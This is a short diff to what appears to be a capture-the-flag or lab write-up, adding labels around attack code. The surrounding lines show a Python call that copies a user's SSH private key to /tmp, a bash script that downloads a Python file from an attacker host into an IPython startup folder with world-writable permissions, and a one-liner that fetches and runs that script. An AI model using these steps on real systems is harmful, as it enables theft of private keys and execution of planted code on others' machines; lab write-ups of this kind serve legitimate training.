@@ -81,6 +81,8 @@ import os
 os.system("cat /home/dan_smith/.ssh/id_rsa > /tmp/id_rsa")
 
 ```
+
+script.sh
 ```bash
 #!/usr/bin/bash
 
@@ -91,6 +93,8 @@ chmod 777 /opt/scripts_review/profile_default/startup
 wget http://10.10.16.19/os.py -O /opt/scripts_review/profile_default/startup/os.py
 chmod 777 /opt/scripts_review/profile_default/startup/os.py
 ```
+
+for execute the script
 ```
 wget http://10.10.16.19/script.sh && chmod +x script.sh && bash script.sh
 ```
